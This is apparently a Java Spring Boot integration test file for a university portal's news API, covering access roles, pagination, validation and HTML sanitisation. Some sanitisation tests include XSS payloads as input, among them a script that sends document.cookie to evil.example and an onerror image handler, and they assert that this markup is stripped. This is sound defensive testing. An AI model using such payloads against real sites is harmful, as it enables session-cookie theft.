package ru.stankin.uits.module.news;

import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.resttestclient.TestRestTemplate;
import org.springframework.core.ParameterizedTypeReference;
import org.springframework.http.*;
import org.springframework.security.crypto.password.PasswordEncoder;
import ru.stankin.uits.AbstractIntegrationTest;
import ru.stankin.uits.common.PageResponseDto;
import ru.stankin.uits.module.auth.controller.AuthController;
import ru.stankin.uits.module.news.dto.NewsRequestDto;
import ru.stankin.uits.module.news.dto.NewsResponseDto;
import ru.stankin.uits.module.news.entity.NewsPost;
import ru.stankin.uits.module.news.repository.NewsRepository;
import ru.stankin.uits.module.user.entity.User;
import ru.stankin.uits.module.user.repository.UserRepository;

import java.net.URI;
import java.time.OffsetDateTime;
import java.util.List;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;

public class NewsIntegrationTest extends AbstractIntegrationTest {
    @Autowired
    private TestRestTemplate restTemplate;

    @Autowired
    private NewsRepository newsRepository;

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private PasswordEncoder passwordEncoder;

    private static final long MISSING_ID = 999_999L;


    @Test
    void createNews_WhenAdmin_SavesToDb() {
        User savedAdmin = createAdmin();
        String token = login("admin");

        ResponseEntity<Void> response = restTemplate.postForEntity(
                "/api/news", withToken(validRequest(), token), Void.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.CREATED);
        List<NewsPost> news = newsRepository.findAll();
        assertThat(news).hasSize(1);
        assertThat(news.getFirst().getTitle()).isEqualTo("Test News Title");
        assertThat(news.getFirst().getAuthor().getId()).isEqualTo(savedAdmin.getId());
    }

    @Test
    void createNews_WhenModerator_SavesToDb() {
        createModerator();
        String token = login("moderator");

        ResponseEntity<Void> response = restTemplate.postForEntity(
                "/api/news", withToken(validRequest(), token), Void.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.CREATED);
        assertThat(newsRepository.findAll()).hasSize(1);
    }

    @Test
    void createNews_ReturnsLocationPointingToCreatedNews() {
        createAdmin();
        String token = login("admin");

        ResponseEntity<NewsResponseDto> response = restTemplate.postForEntity(
                "/api/news", withToken(validRequest(), token), NewsResponseDto.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.CREATED);
        NewsResponseDto body = response.getBody();
        assertThat(body).isNotNull();
        assertThat(body.getId()).isNotNull();
        assertThat(body.getTitle()).isEqualTo("Test News Title");
        assertThat(body.getDisplay()).isTrue();

        URI location = response.getHeaders().getLocation();
        assertThat(location).isNotNull();
        assertThat(location.getPath()).isEqualTo("/api/news/" + body.getId());

        // Location обязан вести на живой ресурс, а не просто выглядеть правдоподобно
        ResponseEntity<NewsResponseDto> byLocation = restTemplate.exchange(
                location.getPath(), HttpMethod.GET, withToken(token), NewsResponseDto.class);

        assertThat(byLocation.getStatusCode()).isEqualTo(HttpStatus.OK);
        assertThat(byLocation.getBody()).isNotNull();
        assertThat(byLocation.getBody().getId()).isEqualTo(body.getId());
    }

    @Test
    void createNews_WhenUser_ReturnsForbidden() {
        createPlainUser();
        String token = login("user");

        ResponseEntity<ProblemDetail> response = restTemplate.postForEntity(
                "/api/news", withToken(validRequest(), token), ProblemDetail.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.FORBIDDEN);
        assertThat(response.getBody()).isNotNull();
        assertThat(response.getBody().getDetail()).isEqualTo("Недостаточно прав.");
        assertThat(newsRepository.findAll()).isEmpty();
    }

    @Test
    void createNews_WhenAnonymous_Returns401() {
        ResponseEntity<ProblemDetail> response = restTemplate.postForEntity(
                "/api/news", validRequest(), ProblemDetail.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.UNAUTHORIZED);
        assertThat(response.getBody()).isNotNull();
        assertThat(response.getBody().getDetail()).isEqualTo("Требуется аутентификация.");
        assertThat(response.getBody().getInstance()).hasPath("/api/news");
        assertThat(newsRepository.findAll()).isEmpty();
    }

    @Test
    void getNews_ReturnsPublicNews() {
        User admin = createAdmin();
        saveNews(admin, "Public News", true);
        saveNews(admin, "Hidden News", false);

        ResponseEntity<PageResponseDto<NewsResponseDto>> response = restTemplate.exchange(
            "/api/public/news",
            HttpMethod.GET,
            null,
            new ParameterizedTypeReference<>() {});

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
        PageResponseDto<NewsResponseDto> body = response.getBody();
        assertThat(body).isNotNull();
        assertThat(body.content()).hasSize(1);
        assertThat(body.content().getFirst().getTitle()).isEqualTo("Public News");
        assertThat(body.totalElements()).isEqualTo(1);
    }

    @Test
    void getNews_WhenPageAndSizeAreSet_ReturnsRequestedSlice() {
        User admin = createAdmin();
        saveNews(admin, "Alpha", true);
        saveNews(admin, "Beta", true);
        saveNews(admin, "Gamma", true);

        ResponseEntity<PageResponseDto<NewsResponseDto>> response = restTemplate.exchange(
                "/api/public/news?page=1&size=1&sort=title,asc",
                HttpMethod.GET,
                null,
                new ParameterizedTypeReference<>() {});

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
        PageResponseDto<NewsResponseDto> body = response.getBody();
        assertThat(body).isNotNull();
        // Вторая страница по одному элементу при сортировке по title — ровно "Beta"
        assertThat(body.content()).hasSize(1);
        assertThat(body.content().getFirst().getTitle()).isEqualTo("Beta");
        assertThat(body.page()).isEqualTo(1);
        assertThat(body.size()).isEqualTo(1);
        assertThat(body.totalElements()).isEqualTo(3);
        assertThat(body.totalPages()).isEqualTo(3);
    }

    @Test
    void getNews_ResponseMatchesPageContract() {
        // Контракт фронта: имена полей страницы проверяются по сырому JSON,
        // а не через десериализацию в PageResponseDto — она не заметит переименование
        ResponseEntity<Map<String, Object>> response = restTemplate.exchange(
                "/api/public/news",
                HttpMethod.GET,
                null,
                new ParameterizedTypeReference<>() {});

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
        assertThat(response.getBody())
                .containsOnlyKeys("content", "page", "size", "totalElements", "totalPages");
    }

    @Test
    void createNews_WhenPostTypeIsUnknown_Returns400() {
        String token = createAdminAndLogin();

        NewsRequestDto request = NewsRequestDto.builder()
                .title("Test News Title")
                .postType("garbage")
                .content("Test Content")
                .display(true)
                .build();

        ResponseEntity<ProblemDetail> response = restTemplate.postForEntity(
                "/api/news", withToken(request, token), ProblemDetail.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST);
        assertThat(fieldErrors(response)).containsKey("postType");
        assertThat(newsRepository.findAll()).isEmpty();
    }

    @Test
    void createNews_WhenDisplayIsMissing_Returns400() {
        String token = createAdminAndLogin();

        HttpHeaders headers = new HttpHeaders();
        headers.setBearerAuth(token);
        headers.setContentType(MediaType.APPLICATION_JSON);
        String bodyWithoutDisplay = """
                {"title": "Test News Title", "postType": "news", "content": "Test Content"}
                """;
        HttpEntity<String> entity = new HttpEntity<>(bodyWithoutDisplay, headers);

        ResponseEntity<ProblemDetail> response = restTemplate.postForEntity("/api/news", entity, ProblemDetail.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST);
        assertThat(fieldErrors(response)).containsKey("display");
        assertThat(newsRepository.findAll()).isEmpty();
    }

    @Test
    void createNews_WhenPreviewImageIsTooLong_Returns400() {
        String token = createAdminAndLogin();

        NewsRequestDto request = NewsRequestDto.builder()
                .title("Test News Title")
                .postType("news")
                .content("Test Content")
                .previewImage("a".repeat(101))
                .display(true)
                .build();

        ResponseEntity<ProblemDetail> response = restTemplate.postForEntity(
                "/api/news", withToken(request, token), ProblemDetail.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST);
        assertThat(fieldErrors(response)).containsKey("previewImage");
        assertThat(newsRepository.findAll()).isEmpty();
    }

    @Test
    void createNews_WhenContentContainsScript_StripsScriptAndKeepsFormatting() {
        String token = createAdminAndLogin();

        // Смесь легального форматирования и исполняемого тега: чистка обязана
        // различать их, а не резать разметку целиком
        NewsRequestDto request = NewsRequestDto.builder()
                .title("Test News Title")
                .shortDescription("Test Description")
                .postType("news")
                .content("<p>Защиты пройдут в аудитории <b>0500</b></p>"
                        + "<script>fetch('https://evil.example/?t=' + document.cookie)</script>")
                .display(true)
                .build();

        ResponseEntity<Void> response = restTemplate.postForEntity(
                "/api/news", withToken(request, token), Void.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.CREATED);

        // Проверяем хранилище, а не тело ответа: контент чистится на входе,
        // значит в базе не должно остаться исполняемой разметки
        NewsPost saved = newsRepository.findAll().getFirst();
        assertThat(saved.getContent())
                .doesNotContain("<script")
                .contains("<b>0500</b>");
    }

    @Test
    void updateNews_WhenContentContainsScript_StripsScript() {
        User admin = createAdmin();
        NewsPost saved = saveNews(admin, "Old Title", true);
        createModerator();
        String token = login("moderator");

        NewsRequestDto request = NewsRequestDto.builder()
                .title("New Title")
                .shortDescription("New Description")
                .postType("news")
                .content("<p>Новый текст</p><script>alert(1)</script>")
                .display(true)
                .build();

        ResponseEntity<NewsResponseDto> response = restTemplate.exchange(
                "/api/news/" + saved.getId(), HttpMethod.PUT, withToken(request, token), NewsResponseDto.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);

        // Правка существующей новости — вторая дверь в базу, и она тоже должна быть закрыта
        NewsPost updated = newsRepository.findById(saved.getId()).orElseThrow();
        assertThat(updated.getContent())
                .doesNotContain("<script")
                .contains("<p>Новый текст</p>");
    }

    @Test
    void createNews_WhenContentContainsEventHandler_StripsHandler() {
        String token = createAdminAndLogin();

        // Тега script здесь нет: код спрятан в атрибуте. Ловится только белым списком
        NewsRequestDto request = NewsRequestDto.builder()
                .title("Test News Title")
                .shortDescription("Test Description")
                .postType("news")
                .content("<p>Текст <img src=\"x\" onerror=\"alert(1)\"></p>")
                .display(true)
                .build();

        ResponseEntity<Void> response = restTemplate.postForEntity(
                "/api/news", withToken(request, token), Void.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.CREATED);

        NewsPost saved = newsRepository.findAll().getFirst();
        assertThat(saved.getContent())
                .doesNotContain("onerror")
                .doesNotContain("alert(1)");
    }

    @Test
    void createNews_WhenContentHasRelativeImage_KeepsImage() {
        String token = createAdminAndLogin();

        // Картинки портала лежат по относительным путям — чистка не должна их терять
        NewsRequestDto request = NewsRequestDto.builder()
                .title("Test News Title")
                .shortDescription("Test Description")
                .postType("news")
                .content("<p>Фото с защиты</p><img src=\"/media/foto.jpg\">")
                .display(true)
                .build();

        ResponseEntity<Void> response = restTemplate.postForEntity(
                "/api/news", withToken(request, token), Void.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.CREATED);

        NewsPost saved = newsRepository.findAll().getFirst();
        assertThat(saved.getContent()).contains("/media/foto.jpg");
    }

    @Test
    void getNews_WhenSortFieldIsUnknown_Returns400() {
        ResponseEntity<ProblemDetail> response = restTemplate.getForEntity(
                "/api/public/news?sort=abc",
                ProblemDetail.class
        );

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST);
        assertThat(response.getBody()).isNotNull();
        assertThat(response.getBody().getDetail()).contains("abc");
    }

    @Test
    void getNews_WhenSortFieldIsValid_AppliesSorting() {
        User admin = createAdmin();
        saveNews(admin, "Alpha", true);
        saveNews(admin, "Beta", true);

        ResponseEntity<PageResponseDto<NewsResponseDto>> response = restTemplate.exchange(
                "/api/public/news?sort=title,desc",
                HttpMethod.GET,
                null,
                new ParameterizedTypeReference<>() {});

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
        PageResponseDto<NewsResponseDto> body = response.getBody();
        assertThat(body).isNotNull();
        assertThat(body.content())
                .extracting(NewsResponseDto::getTitle)
                .containsExactly("Beta", "Alpha");
    }

    @Test
    void getPublishedNewsById_WhenDisplayed_ReturnsNews() {
        User admin = createAdmin();
        NewsPost saved = saveNews(admin, "Public News", true);

        ResponseEntity<NewsResponseDto> response = restTemplate.getForEntity(
                "/api/public/news/" + saved.getId(), NewsResponseDto.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
        assertThat(response.getBody()).isNotNull();
        assertThat(response.getBody().getId()).isEqualTo(saved.getId());
        assertThat(response.getBody().getTitle()).isEqualTo("Public News");
        assertThat(response.getBody().getDisplay()).isTrue();
    }

    @Test
    void getPublishedNewsById_WhenHidden_Returns404() {
        // Скрытая новость и несуществующая для анонима неотличимы:
        // 403 выдал бы факт существования черновика
        User admin = createAdmin();
        NewsPost hidden = saveNews(admin, "Hidden News", false);

        ResponseEntity<ProblemDetail> response = restTemplate.getForEntity(
                "/api/public/news/" + hidden.getId(), ProblemDetail.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.NOT_FOUND);
        assertThat(response.getBody()).isNotNull();
        assertThat(response.getBody().getDetail()).isEqualTo("Ресурс не найден.");
    }

    @Test
    void getPublishedNewsById_WhenMissing_Returns404() {
        ResponseEntity<ProblemDetail> response = restTemplate.getForEntity(
                "/api/public/news/" + MISSING_ID, ProblemDetail.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.NOT_FOUND);
        assertThat(response.getBody()).isNotNull();
        assertThat(response.getBody().getDetail()).isEqualTo("Ресурс не найден.");
    }

    @Test
    void getAllNews_WhenModerator_IncludesHidden() {
        User admin = createAdmin();
        saveNews(admin, "Public News", true);
        saveNews(admin, "Hidden News", false);
        createModerator();
        String token = login("moderator");

        ResponseEntity<PageResponseDto<NewsResponseDto>> response = restTemplate.exchange(
                "/api/news?sort=title,asc",
                HttpMethod.GET,
                withToken(token),
                new ParameterizedTypeReference<>() {});

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
        PageResponseDto<NewsResponseDto> body = response.getBody();
        assertThat(body).isNotNull();
        assertThat(body.totalElements()).isEqualTo(2);
        assertThat(body.content())
                .extracting(NewsResponseDto::getTitle)
                .containsExactly("Hidden News", "Public News");
        assertThat(body.content())
                .extracting(NewsResponseDto::getDisplay)
                .containsExactly(false, true);
    }

    @Test
    void getAllNews_WhenUser_ReturnsForbidden() {
        createPlainUser();
        String token = login("user");

        ResponseEntity<ProblemDetail> response = restTemplate.exchange(
                "/api/news", HttpMethod.GET, withToken(token), ProblemDetail.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.FORBIDDEN);
        assertThat(response.getBody()).isNotNull();
        assertThat(response.getBody().getDetail()).isEqualTo("Недостаточно прав.");
    }

    @Test
    void getAllNews_WhenAnonymous_Returns401() {
        ResponseEntity<ProblemDetail> response = restTemplate.getForEntity("/api/news", ProblemDetail.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.UNAUTHORIZED);
        assertThat(response.getBody()).isNotNull();
        assertThat(response.getBody().getDetail()).isEqualTo("Требуется аутентификация.");
    }

    @Test
    void getNewsById_WhenModerator_ReturnsHidden() {
        User admin = createAdmin();
        NewsPost hidden = saveNews(admin, "Hidden News", false);
        createModerator();
        String token = login("moderator");

        ResponseEntity<NewsResponseDto> response = restTemplate.exchange(
                "/api/news/" + hidden.getId(), HttpMethod.GET, withToken(token), NewsResponseDto.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
        assertThat(response.getBody()).isNotNull();
        assertThat(response.getBody().getTitle()).isEqualTo("Hidden News");
        assertThat(response.getBody().getDisplay()).isFalse();
    }

    @Test
    void getNewsById_WhenMissing_Returns404() {
        String token = createAdminAndLogin();

        ResponseEntity<ProblemDetail> response = restTemplate.exchange(
                "/api/news/" + MISSING_ID, HttpMethod.GET, withToken(token), ProblemDetail.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.NOT_FOUND);
        assertThat(response.getBody()).isNotNull();
        assertThat(response.getBody().getDetail()).isEqualTo("Ресурс не найден.");
    }

    @Test
    void updateNews_WhenModerator_UpdatesFieldsAndKeepsAuthorAndCreatedAt() {
        User admin = createAdmin();
        NewsPost saved = saveNews(admin, "Old Title", true);
        OffsetDateTime createdAtBefore = newsRepository.findById(saved.getId()).orElseThrow().getCreatedAt();
        createModerator();
        String token = login("moderator");

        NewsRequestDto request = NewsRequestDto.builder()
                .title("New Title")
                .shortDescription("New Description")
                .postType("announcements")
                .content("New Content")
                .display(false)
                .build();

        ResponseEntity<NewsResponseDto> response = restTemplate.exchange(
                "/api/news/" + saved.getId(), HttpMethod.PUT, withToken(request, token), NewsResponseDto.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
        assertThat(response.getBody()).isNotNull();
        assertThat(response.getBody().getTitle()).isEqualTo("New Title");
        assertThat(response.getBody().getDisplay()).isFalse();

        NewsPost updated = newsRepository.findById(saved.getId()).orElseThrow();
        assertThat(updated.getTitle()).isEqualTo("New Title");
        assertThat(updated.getPostType()).isEqualTo("announcements");
        assertThat(updated.isDisplay()).isFalse();
        // Редактор не становится автором, дата создания не съезжает
        assertThat(updated.getAuthor().getId()).isEqualTo(admin.getId());
        assertThat(updated.getCreatedAt()).isEqualTo(createdAtBefore);
    }

    @Test
    void updateNews_WhenFieldIsOmitted_ClearsIt() {
        // PUT — полная замена состояния: не присланное поле обнуляется, а не сохраняется
        User admin = createAdmin();
        NewsPost saved = saveNews(admin, "Old Title", true);
        String token = login("admin");

        NewsRequestDto request = NewsRequestDto.builder()
                .title("New Title")
                .postType("news")
                .content("New Content")
                .display(true)
                .build();

        ResponseEntity<NewsResponseDto> response = restTemplate.exchange(
                "/api/news/" + saved.getId(), HttpMethod.PUT, withToken(request, token), NewsResponseDto.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
        assertThat(newsRepository.findById(saved.getId()).orElseThrow().getShortDescription()).isNull();
    }

    @Test
    void updateNews_WhenMissing_Returns404() {
        String token = createAdminAndLogin();

        ResponseEntity<ProblemDetail> response = restTemplate.exchange(
                "/api/news/" + MISSING_ID, HttpMethod.PUT, withToken(validRequest(), token), ProblemDetail.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.NOT_FOUND);
        assertThat(response.getBody()).isNotNull();
        assertThat(response.getBody().getDetail()).isEqualTo("Ресурс не найден.");
    }

    @Test
    void updateNews_WhenTitleIsTooShort_Returns400() {
        User admin = createAdmin();
        NewsPost saved = saveNews(admin, "Old Title", true);
        String token = login("admin");

        NewsRequestDto request = NewsRequestDto.builder()
                .title("aa")
                .postType("news")
                .content("New Content")
                .display(true)
                .build();

        ResponseEntity<ProblemDetail> response = restTemplate.exchange(
                "/api/news/" + saved.getId(), HttpMethod.PUT, withToken(request, token), ProblemDetail.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.BAD_REQUEST);
        assertThat(fieldErrors(response)).containsKey("title");
        assertThat(newsRepository.findById(saved.getId()).orElseThrow().getTitle()).isEqualTo("Old Title");
    }

    @Test
    void updateNews_WhenUser_ReturnsForbidden() {
        User admin = createAdmin();
        NewsPost saved = saveNews(admin, "Old Title", true);
        createPlainUser();
        String token = login("user");

        ResponseEntity<ProblemDetail> response = restTemplate.exchange(
                "/api/news/" + saved.getId(), HttpMethod.PUT, withToken(validRequest(), token), ProblemDetail.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.FORBIDDEN);
        assertThat(newsRepository.findById(saved.getId()).orElseThrow().getTitle()).isEqualTo("Old Title");
    }

    @Test
    void deleteNews_WhenModerator_RemovesFromDb() {
        User admin = createAdmin();
        NewsPost saved = saveNews(admin, "Doomed News", true);
        createModerator();
        String token = login("moderator");

        ResponseEntity<Void> response = restTemplate.exchange(
                "/api/news/" + saved.getId(), HttpMethod.DELETE, withToken(token), Void.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.NO_CONTENT);
        assertThat(newsRepository.findAll()).isEmpty();
    }

    @Test
    void deleteNews_WhenMissing_Returns404() {
        // deleteById молча ничего не делает на несуществующем id —
        // без явной проверки админка получила бы «удалено» на пустом месте
        String token = createAdminAndLogin();

        ResponseEntity<ProblemDetail> response = restTemplate.exchange(
                "/api/news/" + MISSING_ID, HttpMethod.DELETE, withToken(token), ProblemDetail.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.NOT_FOUND);
        assertThat(response.getBody()).isNotNull();
        assertThat(response.getBody().getDetail()).isEqualTo("Ресурс не найден.");
    }

    @Test
    void deleteNews_WhenUser_ReturnsForbidden() {
        User admin = createAdmin();
        NewsPost saved = saveNews(admin, "Doomed News", true);
        createPlainUser();
        String token = login("user");

        ResponseEntity<ProblemDetail> response = restTemplate.exchange(
                "/api/news/" + saved.getId(), HttpMethod.DELETE, withToken(token), ProblemDetail.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.FORBIDDEN);
        assertThat(newsRepository.findAll()).hasSize(1);
    }

    @Test
    void deleteNews_WhenAnonymous_Returns401() {
        User admin = createAdmin();
        NewsPost saved = saveNews(admin, "Doomed News", true);

        ResponseEntity<ProblemDetail> response = restTemplate.exchange(
                "/api/news/" + saved.getId(), HttpMethod.DELETE, null, ProblemDetail.class);

        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.UNAUTHORIZED);
        assertThat(newsRepository.findAll()).hasSize(1);
    }

    private NewsRequestDto validRequest() {
        return NewsRequestDto.builder()
                .title("Test News Title")
                .shortDescription("Test Description")
                .postType("news")
                .content("Test Content")
                .display(true)
                .build();
    }

    private <T> HttpEntity<T> withToken(T body, String token) {
        HttpHeaders headers = new HttpHeaders();
        headers.setBearerAuth(token);
        return new HttpEntity<>(body, headers);
    }

    private HttpEntity<Void> withToken(String token) {
        HttpHeaders headers = new HttpHeaders();
        headers.setBearerAuth(token);
        return new HttpEntity<>(headers);
    }

    private User createAdmin() {
        User admin = User.builder()
                .username("admin")
                .password(passwordEncoder.encode("password"))
                .superuser(true)
                .active(true)
                .build();
        return userRepository.save(admin);
    }

    private User createModerator() {
        User moderator = User.builder()
                .username("moderator")
                .password(passwordEncoder.encode("password"))
                .superuser(false)
                .moderator(true)
                .active(true)
                .build();
        return userRepository.save(moderator);
    }

    private User createPlainUser() {
        User user = User.builder()
                .username("user")
                .password(passwordEncoder.encode("password"))
                .superuser(false)
                .moderator(false)
                .active(true)
                .build();
        return userRepository.save(user);
    }

    private String createAdminAndLogin() {
        createAdmin();
        return login("admin");
    }

    private NewsPost saveNews(User author, String title, boolean display) {
        NewsPost post = NewsPost.builder()
                .title(title)
                .shortDescription("Desc")
                .postType("news")
                .content("Content")
                .display(display)
                .author(author)
                .build();
        return newsRepository.save(post);
    }

    @SuppressWarnings("unchecked")
    private Map<String, Object> fieldErrors(ResponseEntity<ProblemDetail> response) {
        assertThat(response.getBody()).isNotNull();
        assertThat(response.getBody().getProperties()).isNotNull();
        return (Map<String, Object>) response.getBody().getProperties().get("errors");
    }

    private String login(String username) {
        AuthController.LoginRequest loginRequest = new AuthController.LoginRequest(username, "password");
        ResponseEntity<AuthController.LoginResponse> response = restTemplate.postForEntity(
                "/api/users/auth/login",
                loginRequest,
                AuthController.LoginResponse.class
        );
        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.OK);
        assertThat(response.getBody()).isNotNull();
        return response.getBody().accessToken();
    }
}
